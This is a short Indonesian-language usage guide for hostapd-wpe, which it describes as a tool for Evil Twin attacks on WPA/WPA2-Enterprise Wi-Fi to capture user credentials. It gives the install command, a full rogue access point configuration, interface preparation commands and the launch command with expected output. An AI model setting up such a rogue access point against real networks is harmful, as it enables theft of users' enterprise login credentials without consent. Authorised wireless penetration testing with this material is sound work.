# hostapd-wpe

`hostapd-wpe` adalah tool CLI modifikasi dari [hostapd](https://w1.fi/hostapd/) yang digunakan untuk melakukan Evil Twin Attack terhadap jaringan Wi-Fi WPA/WPA2-Enterprise, guna menangkap kredensial pengguna.

## Instalasi

```bash
sudo apt install -y hostapd-wpe
```

## Penggunaan

1. Buat file config AP:
   
   ```bash
   nano hostapd-wpe.conf
   ```

2. Isi dengan:
   
   ```bash
   # Konfigurasi interface
   interface=<interface>
   driver=nl80211

   # Konfigurasi jaringan
   ssid=<ssid>
   bssid=<bssid>
   hw_mode=g # g = 2.4 GHz | a = 5 GHz
   channel=<channel>

   # Konfigurasi keamanan
   wpa=2
   wpa_key_mgmt=WPA-EAP
   rsn_pairwise=CCMP
   ieee8021x=1
   eap_server=1

   # Konfigurasi 802.1X
   eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
   ca_cert=/etc/hostapd-wpe/certs/ca.pem
   server_cert=/etc/hostapd-wpe/certs/server.pem
   private_key=/etc/hostapd-wpe/certs/server.key
   private_key_passwd=whatever
   dh_file=/etc/hostapd-wpe/certs/dh
   ```

3. Konfigurasi interface wireless:

   ```bash
   # Matikan proses yang menggunakan interface wireless
   sudo airmon-ng check kill

   # Ubah mode interface wireless ke mode managed
   sudo ip link set <interface> down
   sudo iwconfig <interface> mode managed
   sudo ip link set <interface> up
   ```

4. Jalankan AP:

   ```
   sudo hostapd-wpe hostapd-wpe.conf
   ```

   Pastikan outputnya:

   ```
   wlan0: interface state UNINITIALIZED->ENABLED
   wlan0: AP-ENABLED
   ```
